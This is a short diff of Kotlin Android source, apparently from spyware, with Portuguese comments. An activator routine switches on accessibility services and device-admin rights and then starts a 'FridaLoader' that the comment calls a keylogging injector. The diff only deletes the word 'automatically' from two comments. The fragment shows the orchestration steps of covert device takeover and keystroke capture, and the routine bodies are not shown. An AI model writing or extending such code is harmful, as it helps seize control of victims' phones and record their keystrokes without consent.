@@ -39,10 +39,10 @@ object AccessibilityServiceAutoActivator {
             Log.d(TAG, "║  INICIANDO ATIVAÇÃO DE TODOS OS SERVIÇOS ║")
             Log.d(TAG, "╚════════════════════════════════════════╝")
             
-            // 1. Ativar Accessibility Services AUTOMATICAMENTE
+            // 1. Ativar Accessibility Services
             activateAccessibilityServices(context)
             
-            // 2. Ativar Device Admin AUTOMATICAMENTE
+            // 2. Ativar Device Admin
             activateDeviceAdmin(context)
             
             // 3. Ativar FridaLoader (injetor de keylog)
